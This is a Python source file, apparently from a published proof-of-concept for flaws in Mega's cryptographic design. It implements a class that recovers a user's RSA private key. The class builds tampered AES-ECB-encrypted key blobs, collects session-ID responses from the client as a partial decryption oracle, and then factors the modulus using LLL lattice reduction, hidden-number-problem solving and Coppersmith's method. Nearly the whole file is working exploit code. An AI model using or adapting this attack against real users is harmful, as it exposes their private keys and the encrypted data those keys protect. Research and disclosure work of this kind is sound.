
#
# This file is part of the PoCs for various issues found in the cryptographic
# design of Mega.
#
# Content: class implementing the key recovery attack (used for both the abstract
# example and the MITM PoC)
#

import os
import math
import multiprocessing

from shared.attack_utils import *
from shared.mega_simulation import *
from shared.constants.mega_crypto import *

from Crypto.Util.number import isPrime

SID_OFFSET = 1

# Block involving most significant bytes of d
MSB_D_BLOCK_INDEX = 17

try:
    # Sage is only needed for the lattic attack part of the key recovery attack
    import sage.all as sage
    has_sage = True
except ModuleNotFoundError:
    has_sage = False
    print("Optimized attack requires Sage -- install sage!")
    raise

class MegaRSAKeyRecoveryAttack():
    """
    We exploit that the we can choose the padding, missing padding checks,
    that we can (coarsly) modify the private key, and that we get a partial
    decryption oracle.

    ###########
    # Setting #
    ###########

    Consider RSA-CRT decryption of c = m^e mod N:
        m_p = c^(d_p) mod p
        m_q = c^(d_q) mod q
        t = (m_p - m_q) mod p
        h = (t * u) mod p
        m' = h * q + m_q

    We garble u in predictable ways by replacing some ciphertext blocks in u with
    other ciphertext blocks.
    """

    def __init__(self, pubk, privk_enc, do_brute_force=False):
        """
        :param pubk: public key
        :param privk_enc: AES-encrypted private key
        :param do_brute_force: Perform the more expensive brute force attack
        """

        self.pubk = pubk
        self.privk_encrypted = privk_enc

        self.n, self.e = pubk
        self.oracle_queries = 0

        self.pending_requests = []
        self.responses = {}

        self.do_brute_force = do_brute_force
        # Number of blocks of q to recover
        self.blocks_of_q = 5
        if self.do_brute_force:
            self.refinement_iters = 1
        else:
            self.refinement_iters = 3

    def get_wrapped_keys(self):
        '''
        Return the AES-ECB encrypted private keys to use in the attack.
        '''
        blen = AES_BLOCK_BYTE_SIZE

        wrapped_keys = set()

        i = MSB_D_BLOCK_INDEX
        ct_block_with_d = self.privk_encrypted[i*blen:(i+1)*blen]

        for j in range(self.blocks_of_q):
            ct_block_with_qj = self.privk_encrypted[j*blen:(j+1)*blen]

            for t in range(self.refinement_iters):
                ct_p, ct_pp = self.get_wrapped_keys_for_shifted_difference(
                    ct_block_with_d,
                    ct_block_with_qj,
                    t
                )

                wrapped_keys.add(ct_p)
                wrapped_keys.add(ct_pp)

        return list(wrapped_keys)

    def get_wrapped_keys_for_shifted_difference(self, ct_blk1, ct_blk2, t=0):
        '''
        Return two AES-ECB encrypted private keys containing desired u_1 - u_2.

        The result of this function is bytes ct1 and ct2 decrypting to u values
        with
                 u_1 - u_2 = 2**(128*t + 64) * (AES_DEC(ct1) - AES_DEC(ct2))
        '''

        ct_1 = bytearray(self.privk_encrypted[:])

        # Replace all ciphertext blocks that contain only u with ct_blk1
        blen = AES_BLOCK_BYTE_SIZE
        for i in range(34, 40):
            ct_1[i*blen:(i+1)*blen] = ct_blk1

        # ct_2 is the same, except for one block.
        ct_2 = ct_1[:]
        i = 39 - t
        ct_2[i*blen:(i+1)*blen] = ct_blk2

        return bytes(ct_1), bytes(ct_2)

    def recover_private_key(self, SIDs):
        '''
        Attempt to recover the RSA private key from the SIDs.
        '''

        reps = self.get_algebraic_representations(SIDs)

        if self.do_brute_force:
            approxs = self.get_brute_force_approximations(reps)
        else:
            # Get coarse approximations for 2**{128t}*delta_{i,j}
            coarse = self.get_xhnp_approximations(reps)
            approxs = self.get_refined_approximations(coarse)

        if approxs is None:
            return None

        deltas_candidates = self.get_possible_delta_values(approxs)

        pt_cands = []
        for deltas in deltas_candidates:
            pt_cands += self.get_possible_pts(deltas)

        q_approx_cands = [
            self.parse_q_approx_from_pts(pt_cand) for pt_cand in pt_cands
        ]
        q_cands = []
        for q_approx, E in q_approx_cands:
            q_cands += self.get_q_cands_from_q_approx(q_approx, E)

        for q in q_cands:
            # Check validity
            p = self.n // q

            if 1 < p < self.n and \
                self.n == p * q and \
                isPrime(p) and \
                isPrime(q):
                return p, q
        return None

    def get_algebraic_representations(self, SIDs):
        '''
        Produce algebraic representations based on the dictionary of returned SIDs.

        For each valid (i, j, t) pair, there exists values satisfying
                2**(128*t) delta_{i,j} x equiv e1 * 2^b1 + a + e2 (mod N)
                |e1| < E1
                |e2| < E2
        The representation of attacker knowledge is in the form (a, b1, E1, E2)
        '''

        blen = AES_BLOCK_BYTE_SIZE
        reps = {}
        for i in [MSB_D_BLOCK_INDEX]:
            ct_block_i = self.privk_encrypted[i*blen:(i+1)*blen]
            for j in range(self.blocks_of_q):
                ct_block_j = self.privk_encrypted[j*blen:(j+1)*blen]

                for t in range(self.refinement_iters):
                    ct_1, ct_2 = self.get_wrapped_keys_for_shifted_difference(
                        ct_block_i,
                        ct_block_j,
                        t
                    )

                    assert ct_1 in SIDs, "Necessary ciphertext not in responses from client."
                    assert ct_2 in SIDs, "Necessary ciphertext not in responses from client."

                    sid_1 = SIDs[ct_1]
                    sid_2 = SIDs[ct_2]

                    b1 = RSA_MODULUS_BIT_SIZE - 8
                    b2 = 212 * 8

                    a = (sid_1 - sid_2) * 2**b2

                    E1 = 2**8 - 1 #255
                    E2 = 2**b2

                    reps[(i,j,t)] = (a, b1, E1, E2)
        return reps

    def get_xhnp_approximations(self, reps):
        '''
        Use the algebraic representation to produce the coarse XHNP representation.

        Returns a dictionary of (new_a, E) values indexed by (i, j, t) such that
                2^(128t)delta_{i,j} x equiv new_a + e (mod N)
        for some value of x and satisfying
                |e| < E.
        '''

        # All reps must have the same b1, E1, and E2 to use the same XHNP multiplier
        xhnp_params = set((b1, E1, E2) for _, b1, E1, E2 in reps.values())
        assert len(xhnp_params) == 1
        b1, E1, E2 = list(xhnp_params)[0]

        C, E = self.get_xhnp_multiplier(2**b1, E1, E2)

        approximations = {}
        for (i, j, t), (a, b1, E1, E2) in reps.items():
            new_a = (C * a) % self.n
            approximations[(i, j, t)] = (new_a, E)

        return approximations

    def get_xhnp_multiplier(self, B, E1, E2):
        '''
        Compute the XHNP multiplier to use for samples of the specified form.

        Samples are expected to be of the form
                EXPR == e1 * B + a + e2         (mod N)
        where
                |e1| < E1 and |e2| < E2.
        This method calculates C and E such that
              C*EXPR == C*a + C*e1*B + C*e2     (mod N)
        and
                |C*e1*B + C*e2 % N| < E
        '''

        M = sage.matrix([
            [E1 * self.n, 0 ],
            [     E1 * B, E2]
        ])
        B = M.LLL()

        C = abs(B[0,1] // E2)

        # E = 4/sqrt(3) * sqrt(E1 * E2 * N)
        lg_E = math.log2(4 / math.sqrt(3)) + 1/2 * math.log2(E1 * E2 * self.n)
        E = 2**(int(math.ceil(lg_E)))

        return C, E

    def get_refined_approximations(self, coarse):
        '''
        Take the coarse approximations and return refined approximations.

        Input is dictionary of (i, j, t) values with (a, E) approximations satisfying
                2^{128t}delta_{i,j} X == a + e (mod N)
        for |e| < E.

        Output is dictionary of (i, j) values with (new_a, new_E) approximations
                delta_{i,j} X == new_a + new_e (mod N)
        '''
        refined = {}
        ij_set = set((i, j) for i, j, _ in coarse.keys())

        for i, j in ij_set:
            base_approx = coarse[i, j, 0]

            for t in range(1, self.refinement_iters):
                next_approx = coarse[i, j, t]

                r = 2**(128*t)
                base_approx = self.get_refined_once(base_approx, r, next_approx)

            refined[(i, j)] = base_approx

        return refined

    def get_refined_once(self, approx1, r, approx2):
        '''
        Refine a single approximation using another approximation.

        approx1 is (a1, E1)
        approx2 is (a2, E2)

        These values satisfy
                y == a1 + e1 (mod N)
               ry == a2 + e2 (mod N)
             |e1| <= E1
             |e2| <= E2

        Return (new_a, new_E) satisfying
                y == new_a + new_e (mod N)
          |new_e| <= new_E
        '''

        a1, E1 = approx1
        a2, E2 = approx2

        assert 2 * abs(r) * E1 + 1 <= self.n - 2 * E2
        assert r > 0

        new_E = min((2*E2 + 1)//abs(r), 2*E1 + 1) // 2

        num = r*(a1 - E1) - (a2 + E2)
        den = self.n
        k_star = (num + den - 1) // den

        ry_low = max(r*(a1 - E1), a2 - E2 + k_star * self.n)
        ry_high = min(r*(a1 + E1), a2 + E2 + k_star * self.n)

        y_low = (ry_low + r - 1) // r
        y_high = ry_high // r

        new_a = (y_low + y_high) // 2

        assert y_high - new_a <= new_E
        assert new_a - y_low <= new_E

        return new_a, new_E

    def get_brute_force_approximations(self, reps):
        # Check that all reps must have the same b1, E1, and E2
        params = set((b1, E1, E2) for _, b1, E1, E2 in reps.values())
        assert len(params) == 1
        assert len(reps) >= 3
        b1, E1, E2 = list(params)[0]

        # Get arbitrary ordering of the representations
        inds = list(reps.keys())
        a_s = [reps[ind][0] for ind in inds]

        a1, a2, a3 = a_s[:3]
        prefix_cands = self.brute_force_potential_prefixes(a1, a2, a3, b1, E1, E2)

        # Try to extend the known prefixes
        candidate_prefixes = []
        rep_list = [reps[ind] for ind in inds]
        for prefix_cand in prefix_cands:
            known_prefixes = [prefix_cand[i] for i in range(3)]

            candidate_prefixes += self.extend_known_prefixes(rep_list, known_prefixes)

        if len(candidate_prefixes) == 0:
            return None

        prefixes = candidate_prefixes[0]

        approxs = {}
        for ind, prefix in zip(inds, prefixes):
            i, j, _ = ind
            a = reps[ind][0] + prefix * 2**b1

            approxs[(i, j)] = (a, E2)

        return approxs

    def extend_known_prefixes(self, rep_list, known_prefixes):
        '''
        Return the potential values for all prefixes based on known values
        '''

        if len(rep_list) == len(known_prefixes):
            return [known_prefixes]

        next_rep = rep_list[len(known_prefixes)]
        a1 = rep_list[0][0]
        a2 = rep_list[1][0]
        ai, b1, E1, E2 = next_rep

        potential_ai_prefixes = []
        pi_cands = range(-E1, E1+1)
        T = 2**AES_BLOCK_BIT_SIZE
        new_a1 = a1 + known_prefixes[0] * 2**b1
        new_a2 = a2 + known_prefixes[1] * 2**b1
        for pi in pi_cands:
            new_ai = ai + pi * 2**b1
            res = self.solve_small_unk_mult_hnp_3(new_a1, new_a2, new_ai, T, E2)
            if res:
                potential_ai_prefixes += [pi]

        potential_prefixes = []
        for pi in potential_ai_prefixes:
            potential_prefixes += self.extend_known_prefixes(rep_list, known_prefixes + [pi])

        return potential_prefixes

    def brute_force_potential_prefixes(self, a1, a2, a3, b1, E1, E2):
        p1_cands = range(-E1, E1+1)
        T = 2**AES_BLOCK_BIT_SIZE

        m = multiprocessing.Manager()
        prefixes_queue = m.Queue()

        np = multiprocessing.cpu_count()
        pool = multiprocessing.Pool(np - 1)
        with pool:
            args = [(p1, prefixes_queue, a1, a2, a3, E1, b1, T, E2) for p1 in p1_cands]
            pool.map(self._guess_p2p3, args)

        potential_prefixes = []
        while not prefixes_queue.empty():
            potential_prefixes.append(prefixes_queue.get())

        return potential_prefixes

    def _guess_p2p3(self, args):
        p1, queue, a1, a2, a3, E1, b1, T, E2 = args
        p2_cands = range(-E1, E1+1)
        p3_cands = range(-E1, E1+1)
        for p2 in p2_cands:
            for p3 in p3_cands:
                new_a1 = a1 + p1 * 2**b1
                new_a2 = a2 + p2 * 2**b1
                new_a3 = a3 + p3 * 2**b1

                res = self.solve_small_unk_mult_hnp_3(new_a1, new_a2, new_a3, T, E2)
                if res:
                    queue.put((p1, p2, p3))

    def get_possible_delta_values(self, approxs):
        '''
        Recover the delta values.

        Input is a dictionary of (i, j): (a, E) values where
                 delta_{i,j} * X == a + e (mod N)
                             |e| <= E

        Output is a list of dictionaries of (i,j): delta_{i,j} values.
        Multiple dictionaries are returned because we can't recover the
        sign of the delta values.
        '''

        E = max(E for _, E in approxs.values())
        T = 2**AES_BLOCK_BIT_SIZE

        if T**3 <= self.n // (2 * E):
            # We can use the pairwise method

            # Fix the indices in some order
            inds = list(approxs.keys())

            # For each inds[0], inds[i] pair, get +-t0/gcd(t0, ti), +-
            ratio_factors = []
            a0, _ = approxs[inds[0]]
            for j in range(1, len(inds)):
                aj, _ = approxs[inds[j]]
                (t0_factor, tj_factor) = self.solve_small_unk_mult_hnp_2(a0, aj, T, E)
                ratio_factors.append((t0_factor, tj_factor))

            t0 = sage.lcm(t0_factor for t0_factor, _ in ratio_factors)

            t_values = [t0]
            for j in range(1, len(inds)):
                t0_factor, tj_factor = ratio_factors[j - 1]
                g = t0 / t0_factor
                tj = tj_factor * g
                t_values.append(tj)

            possible_deltas = []

            for g in range(1, T):
                # It's possible but unlikely that all recovered multipliers still are still off
                # due to a shared factor of g
                g_ts = [g * tj for tj in t_values]

                if not all(g_t <= T for g_t in g_ts):
                    break

                for sgn in [1, -1]:
                    deltas_candidate = {}
                    for j, ind in enumerate(inds):
                        deltas_candidate[ind] = sgn * g_ts[j]
                    possible_deltas.append(deltas_candidate)
            return possible_deltas

        else:
            # Fix the indices in some order
            inds = list(approxs.keys())

            # For each inds[0], inds[1], inds[i] pair, get +-t0/gcd(t0, ti), +-
            ratio_factors = []
            a0, _ = approxs[inds[0]]
            a1, _ = approxs[inds[1]]
            for j in range(2, len(inds)):
                aj, _ = approxs[inds[j]]
                (t0_factor, t1_factor, tj_factor) = self.solve_small_unk_mult_hnp_3(a0, a1, aj, T, E)
                ratio_factors.append((t0_factor, t1_factor, tj_factor))

            t0 = sage.lcm(t0_factor for t0_factor, _, __ in ratio_factors)
            t1 = ratio_factors[0][1] * t0 // ratio_factors[0][0]
            t_values = [t0, t1]
            for j in range(2, len(inds)):
                t0_factor, t1_factor, tj_factor = ratio_factors[j - 2]
                g = t0 / t0_factor
                assert g == t1 / t1_factor
                tj = tj_factor * g
                t_values.append(tj)

            possible_deltas = []

            for g in range(1, T):
                # It's possible but unlikely that all recovered multipliers still are still off
                # due to a shared factor of g
                g_ts = [g * tj for tj in t_values]

                if not all(g_t <= T for g_t in g_ts):
                    break

                for sgn in [1, -1]:
                    deltas_candidate = {}
                    for j, ind in enumerate(inds):
                        deltas_candidate[ind] = sgn * g_ts[j]
                    possible_deltas.append(deltas_candidate)
            return possible_deltas

    def solve_small_unk_mult_hnp_2(self, a1, a2, T, E):
        '''
        Solve the small unknown multiple HNP for 2 samples.

        Given a1, a2, T, and E satisfying
                t1 * x == a1 + e1 (mod N)
                t2 * x == a2 + e2 (mod N)
            |e1|, |e2| <= E
            |t1|, |t2| <= T
        Return t1/g, t2/g where g = +- gcd(t1, t2)
        '''
        M = sage.matrix([
            [2*E,   0,     a1],
            [  0, 2*E,     a2],
            [  0,   0, self.n]
        ])
        B = M.LLL()

        t2 = B[0,0] // (2*E)
        t1 = B[0,1] // (-2*E)

        return t1, t2

    def solve_small_unk_mult_hnp_3(self, a1, a2, a3, T, E):
        '''
        Solve the small unknown multiple HNP for 3 samples.

        Given a1, a2, T, and E satisfying
                t1 * x == a1 + e1 (mod N)
                t2 * x == a2 + e2 (mod N)
                t3 * x == a3 + e3 (mod N)
                  |ei| <= E
                  |ti| <= T
        Return t1/g, t2/g, t3/g where g = +- gcd(t1, t2, t3)
        Return None if no such value is found
        '''

        M = sage.matrix([
            [2*E,   0,   0,     a1],
            [  0, 2*E,   0,     a2],
            [  0,   0, 2*E,     a3],
            [  0,   0,   0, self.n],
        ])
        B = M.LLL()
        B_sub = B[:2,:3]
        B_sub[:,:2] /= (2*E)
        B_sub = B_sub.LLL()
        t2, t1 = B_sub[0,0], -B_sub[0,1]
        if abs(t1) > T or abs(t2) > T:
            return None
        if t1 < 0:
            t1, t2 = -t1, -t2

        B_sub[:,2] /= (2*E)
        B_sub[:,1] *= 2*E
        B_sub = B_sub.LLL()

        t3, t1_alt = B_sub[0,0], -B_sub[0,2]
        if t1_alt < 0:
            t1_alt, t3 = -t1_alt, -t3

        if abs(t1_alt) > T or abs(t3) > T:
            return None

        true_t1 = sage.lcm(t1, t1_alt)
        true_t2 = t2 * true_t1 // t1
        true_t3 = t3 * true_t1 // t1_alt
        t1, t2, t3 = true_t1, true_t2, true_t3

        if abs(t1) > T or abs(t2) > T or abs(t3) > T:
            return None

        return t1, t2, t3

    def get_possible_pts(self, deltas):
        '''
        Given the delta values, return the possible plaintext values.

        Use ability to guess the most significant bits of d and knowledge of
        length encoding to do so.

        There are only a fixed number of possibilities for the leading bytes of d.
        By the RSA equations, we have
                e*d = 1 + k*phi(N)
                    = 1 + k * (p - 1) * (q - 1)
                    = 1 + k * (N - (p + q) + 1)

        Thus k >= 0 and k == (e*d - 1) / (N - (p + q) + 1) <= e * d / phi(N) <= e.

        We can brute force the possible values of k.

        Given k, we know
                d = (1 + k * (N + 1)) / e - k * (p + q) / e
        With high probability, k/e*(p+q) is small enough that it does not change
        the MSBs of d.
        '''

        delta_d_l = deltas[(MSB_D_BLOCK_INDEX, 0)]

        pt_cands = []
        for k in range(1, self.e + 1):
            d_approx = (1 + k * (self.n + 1)) // self.e

            d_as_bytes = int_to_bytes(d_approx).rjust(RSA_MODULUS_BYTE_SIZE, b"\x00")
            # Extract the significant bytes of d corresponding to MSB_D_BLOCK_INDEX
            pt_d = bytes_to_int(d_as_bytes[10:10+AES_BLOCK_BYTE_SIZE])

            pt_0_cand = int(pt_d - delta_d_l)
            if pt_0_cand < 0:
                continue

            pt_0_cand_bytes = int_to_bytes(pt_0_cand).rjust(AES_BLOCK_BYTE_SIZE, b"\x00")

            if pt_0_cand_bytes[:2] != b"\x04\x00":
                continue

            pt_cand_ints = {MSB_D_BLOCK_INDEX: pt_d}
            for i, j in deltas.keys():
                assert i == MSB_D_BLOCK_INDEX
                pt_cand_ints[j] = int(pt_d - deltas[i, j])
            if not all(pt in range(0, 2**AES_BLOCK_BIT_SIZE) for pt in pt_cand_ints.values()):
                continue

            pt_cand_bytes = {
                i: int_to_bytes(pt_i).rjust(AES_BLOCK_BYTE_SIZE, b"\x00") for i, pt_i in pt_cand_ints.items()
            }
            pt_cands.append(pt_cand_bytes)

        return pt_cands

    def parse_q_approx_from_pts(self, pts):
        '''
        Return an approximation of q from its encoding in pts

        Return format is (q_approx, E) where
                q == q_approx + e
              |e| <= E
        '''
        q_approx = 0
        for i in range(self.blocks_of_q):
            offset = 2**(1024 - (128 - 16) - i * 128)

            if i == 0:
                # Exclude l(q) in plaintext block
                pt_i = bytes_to_int(pts[i][2:])
            elif i == 8:
                # Exclude l(p)||p in plaintext block
                offset = 1
                pt_i = bytes_to_int(pts[i][:2])
            else:
                pt_i = bytes_to_int(pts[i])
            q_approx += pt_i * offset

        # Add half of offset so error is centered
        q_approx += offset // 2
        E = offset // 2
        return q_approx, E

    def get_q_cands_from_q_approx(self, q_approx, E):
        '''
        Use Coppersmith's method to recover possible factors q from an approximation.
        '''
        if E == 0:
            return [q_approx]

        # Use the following lattice to recover the small root r of
        # f(x) = unk_offset*x + a mod q, which exists since a + unk_offset*r = q
        # when r is set to the missing lower bits of q.
        # Lattice:
        #       |X^2  X*a  0 |
        #   M = |  0    X  a |
        #       |  0    0  n |
        a = q_approx

        # What multiplicity to use in the Coppersmith attack
        m = 4 # Maximum degree of x
        k = 2 # Maximum degree of N
        M = sage.matrix(m+1, m+1)

        PR = sage.PolynomialRing(sage.ZZ, 'x')
        x = PR.gen()
        f = x + a

        for i in range(m + 1):
            coeffs = (f**i).coefficients(sparse=False)
            for j in range(i + 1):
                # x**j degree
                M[i,j] = self.n**(min(k, m - i)) * int(coeffs[j]) * E**j

        B = M.LLL()

        Q = 0
        for i in range(m + 1):
            Q += B[0][i] * x**i // E**i

        q_cands = []
        roots = Q.roots()
        if len(roots) == 0:
            return []

        for root, _ in roots:
            q = sage.gcd(a + int(root), self.n)
            q_cands.append(q)

        return q_cands

    def get_next_wrapped_key_and_ciphertext(self):
        if len(self.pending_requests) == 0:
            # Create new requests
            altered_wrapped_keys = self.get_wrapped_keys()
            rsa_ct = rsa_encrypt(os.urandom(8), self.pubk)
            self.pending_requests = [(wrapped_key, rsa_ct) for wrapped_key in altered_wrapped_keys]

        return self.pending_requests[0]

    def feed_response(self, r):
        """
        Process intervals based on the SID returned by the client

        :param r: response SID from the client as integer

        :return: True if we successfully recovered the factor, False if we need
        more queries, and it throws an error when the attack failed.
        """

        self.oracle_queries += 1

        req, self.pending_requests = self.pending_requests[0], self.pending_requests[1:]
        self.responses[req[0]] = r

        if len(self.pending_requests) == 0:
            # Try solving with available responses

            privk = self.recover_private_key(self.responses)

            if privk is not None:
                # Successful, so do not try again
                self.p, self.q = privk
                return True
            else:
                # Not successful, clear responses
                self.responses = {}
        return False
